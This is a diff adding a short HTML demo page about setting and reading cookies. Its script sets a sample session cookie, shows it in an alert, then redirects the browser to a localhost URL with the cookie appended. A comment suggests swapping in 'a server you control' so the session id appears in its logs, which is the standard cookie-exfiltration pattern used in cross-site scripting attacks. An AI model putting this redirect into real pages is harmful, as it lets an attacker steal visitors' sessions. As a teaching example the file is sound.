@@ -1,0 +1,15 @@
+<html>
+    <head>
+        To demonstrate setting and manipulation cookies
+    </head>
+    <body>
+
+        <!-- make sure to run this file on http server to get the cookies -->
+        <script> 
+            document.cookie = "sessionsid=123456789;";
+            alert(document.cookie);
+            // use document.location to post session id to or replace with server you control will show up in logs
+            document.location = "http://localhost:8000?" + document.cookie;
+        </script>
+    </body>
+</html>
